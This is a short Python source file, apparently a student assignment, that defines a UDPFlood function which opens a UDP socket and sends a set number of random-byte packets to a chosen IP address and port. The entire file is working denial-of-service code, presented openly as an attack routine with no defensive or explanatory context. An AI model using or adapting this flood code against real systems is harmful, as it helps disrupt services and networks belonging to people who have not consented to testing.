#############################################################################################
# @Author: José Manuel Batista Galanducho
# @Número de Aluno: 13651
# UDPFlood, this class executes the UDP flood attack to a remote ip
#############################################################################################

import socket
import random

from termcolor import colored

def UDPFlood(IP, port, pckt_size=1024, pckt_quantity=20):

    print(colored(f"UDP flood, target ->  {IP}:{port}","green"))
    sckt = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    pckt = random._urandom(pckt_size)

    try:
        for i in range(pckt_quantity):
            sckt.sendto(pckt, (IP, port))
    except Exception as e:
        print(colored(f"Error during UDP flood: {e}","red"))
    finally:
        sckt.close()
